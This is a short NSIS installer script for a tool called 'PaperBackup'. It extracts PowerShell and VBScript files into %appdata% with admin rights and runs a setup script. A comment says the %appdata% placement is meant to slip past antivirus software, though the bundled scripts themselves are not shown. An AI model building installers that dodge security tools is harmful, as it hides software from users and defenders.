# The application is extracted to the %appdata% folder.  This is done to "hopefully" allow it to
# duck under AntiVirus applications.
#
!define PRODUCT_NAME "PaperBackup"
!define PRODUCT_VERSION "1.0.0"

SetCompressor lzma

Name "${PRODUCT_NAME} ${PRODUCT_VERSION}"
OutFile "PaperBackup.exe"
InstallDir "$APPDATA"
Icon "backup.ico"
;SilentInstall silent
SilentInstall normal
RequestExecutionLevel admin

Section "MainSection" SEC01
  SetOverwrite try
  SetOutPath "$INSTDIR"
  File "ArchiveRun1.ps1"
  File "FileZipper.ps1"
  File "main.vbs"
  File "PaperBackup.xml"
  File "main.vbs"
  File "Setup.vbs"
  File "ZipArchive.ini"
  Exec '"$SYSDIR\WScript.exe" "$APPDATA\Setup.vbs"'
  Sleep 1000
  MessageBox MB_OK "Paper System Backup is Scheduled Successfully."
SectionEnd